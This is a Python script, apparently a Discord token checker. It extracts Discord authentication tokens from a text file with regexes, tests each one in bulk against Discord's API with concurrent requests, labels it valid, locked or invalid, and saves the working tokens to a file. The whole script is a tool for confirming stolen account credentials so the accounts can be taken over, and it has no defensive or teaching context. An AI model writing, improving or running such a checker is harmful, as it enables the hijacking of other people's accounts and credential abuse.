import aiosonic
import re
import os
import time
import threading
import asyncio

from typing import Coroutine
from asyncio.tasks import Task


class TaskPool:
    def __init__(self, workers: int) -> None:
        self._semaphore = asyncio.Semaphore(workers)
        self._tasks = set()

    async def put(self, coro: Coroutine) -> None:
        await self._semaphore.acquire()
        task = asyncio.ensure_future(coro)
        self._tasks.add(task)
        task.add_done_callback(self._on_task_done)

    def _on_task_done(self, task: Task) -> None:
        self._tasks.remove(task)
        self._semaphore.release()

    async def join(self) -> None:
        await asyncio.gather(*self._tasks)

    async def __aenter__(self) -> "TaskPool":
        return self

    def __aexit__(self, *_) -> None:
        return self.join()


class RequestTimeout:
    request_timeout = 100
    sock_read = 100
    sock_connect = 100


TOKENS_LOADED = 0
TOKENS_INVALID = 0
TOKENS_LOCKED = 0
TOKENS_VALID = 0
TOKENS_VALID_LIST = []


def filter_tokens(unfiltered):
    tokens = []

    for line in [x.strip() for x in unfiltered.readlines() if x.strip()]:
        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
            for token in re.findall(regex, line):
                if token not in tokens:
                    tokens.append(token)

    return tokens


def title_worker():
    global TOKENS_INVALID, TOKENS_LOCKED, TOKENS_VALID, TOKENS_LOADED
    while True:
        os.system(
            f"title Tokens Loaded: {TOKENS_LOADED} ^| Valid: {TOKENS_VALID} ^| Locked: {TOKENS_LOCKED} ^| Invalid: {TOKENS_INVALID}")
        time.sleep(0.1)


threading.Thread(target=title_worker, daemon=True).start()


async def check(token, client):
    global TOKENS_INVALID, TOKENS_LOCKED, TOKENS_VALID, TOKENS_VALID_LIST

    response = await client.get("https://discord.com/api/v9/users/@me/library", headers={
        "Authorization": token,
        "Content-Type": "application/json"
    }, timeouts=RequestTimeout)

    if response.status_code == 200:
        TOKENS_VALID += 1
        TOKENS_VALID_LIST.append(token)
        print(f'[VALID] {token}')

    elif response.status_code == 401:
        TOKENS_INVALID += 1
        print(f'[INVALID] {token}')

    elif response.status_code == 403:
        TOKENS_LOCKED += 1
        print(f'[LOCKED] {token}')


async def main():
    global TOKENS_INVALID, TOKENS_LOCKED, TOKENS_VALID, TOKENS_LOADED, TOKENS_VALID_LIST

    client = aiosonic.HTTPClient()

    try:
        with open('D:/Programming/anfis/tgbot/handlers/sub_only/tokens.txt', 'r') as tokens:
            filtered = filter_tokens(tokens)
            TOKENS_LOADED = len(filtered)
            async with TaskPool(100) as pool:
                for token in filtered:
                    await pool.put(check(token, client))

            await client.shutdown()

            print(
                f"Tokens Loaded: {TOKENS_LOADED} | Valid: {TOKENS_VALID} | Locked: {TOKENS_LOCKED} | Invalid: {TOKENS_INVALID}")

            with open(f'working.txt', 'w') as handle:
                handle.write('\n'.join(TOKENS_VALID_LIST))
                handle.close()

            input("Saved to working.txt, click enter to exit.")

    except Exception as e:
        print(e)
        input('Can\'t open tokens.txt\nClick enter to exit!')


if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
